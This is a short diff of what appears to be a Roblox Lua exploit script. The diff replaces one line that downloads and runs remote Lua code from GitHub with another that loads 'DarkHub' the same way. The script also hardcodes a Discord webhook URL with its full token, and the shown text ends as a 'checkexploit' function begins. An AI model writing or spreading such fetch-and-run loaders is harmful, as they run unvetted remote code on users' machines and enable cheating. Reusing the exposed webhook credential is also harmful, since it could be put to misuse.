@@ -1,4 +1,4 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/NooVster/404/main/Source'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
 local webh = "https://discord.com/api/webhooks/1091927538336551002/0dh0x3K3EBl1cIGxaNfGOFA-fHe_f3oHpFjBIdGnT-Q84X8xVPIuUvcDwLOgvLlsmOqr"
 
                function checkexploit()
